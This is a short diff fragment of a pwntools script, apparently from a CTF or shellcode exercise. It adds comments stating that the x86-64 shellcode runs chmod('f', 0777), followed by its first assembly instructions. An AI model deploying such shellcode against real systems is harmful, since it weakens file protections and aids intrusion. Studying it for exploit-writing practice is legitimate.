@@ -6,6 +6,9 @@ pwn.context.arch = "amd64"
 pwn.context.os = "linux"
 
 shellcode = r"""
+/* Objective: Execute sys_chmod("f", 0777) */
+/* Pre-condition: rax is 0x0 */
+
 push 0x66
 push rsp
 pop rdi
